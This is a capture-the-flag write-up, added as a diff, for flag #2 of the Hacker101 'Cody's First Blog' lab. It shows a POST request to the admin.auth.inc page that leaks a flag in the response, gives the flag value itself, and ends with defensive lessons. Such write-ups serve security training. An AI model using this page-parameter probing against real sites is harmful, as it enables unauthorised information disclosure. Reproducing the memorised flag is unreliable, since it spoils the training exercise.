@@ -1,0 +1,56 @@
+================================
+LAB: Cody's First Blog - FLAG #2
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 15, 2026
+Lab URL: https://868c57e9406a8f440011476736aa1cd8.ctf.hacker101.com
+Category: Web Security
+Level: Moderate
+Objective: Find hidden flags through web vulnerabilities
+Description: PHP blog application with comment system and admin panel
+
+[RECONNAISSANCE]
+----------------
+Comment system allows POST to any page via ?page= parameter.
+Form submits to current page with body parameter.
+
+Tested comment submission on home page:
+POST / HTTP/2
+body=test
+
+Response: "Comment submitted and awaiting approval!"
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Information Disclosure via comment processing on admin.auth.inc page.
+Flag stored in page code is leaked in POST response.
+
+[EXPLOITATION]
+--------------
+Submit comment on admin login page:
+
+POST /?page=admin.auth.inc HTTP/2
+Content-Type: application/x-www-form-urlencoded
+
+body=test
+
+[EVIDENCE]
+----------
+Response HTML:
+<p>^FLAG^8ec3969588201c6aa741ee2246b136cef4a4ce3ae7d91bca846b90aab157a0b8$FLAG$</p>
+<p>Comment submitted and awaiting approval!</p>
+
+FLAG #2: ^FLAG^8ec3969588201c6aa741ee2246b136cef4a4ce3ae7d91bca846b90aab157a0b8$FLAG$
+
+Flag appears in POST response before comment approval.
+Not visible in subsequent GET requests to same page.
+
+[LESSONS LEARNED]
+-----------------
+- Never store secrets/flags directly in application code
+- Use environment variables for sensitive data
+- Clear output buffers before sending responses
+- Information disclosure can occur in unexpected operations (POST responses)
+- Separate business logic from data exposure paths
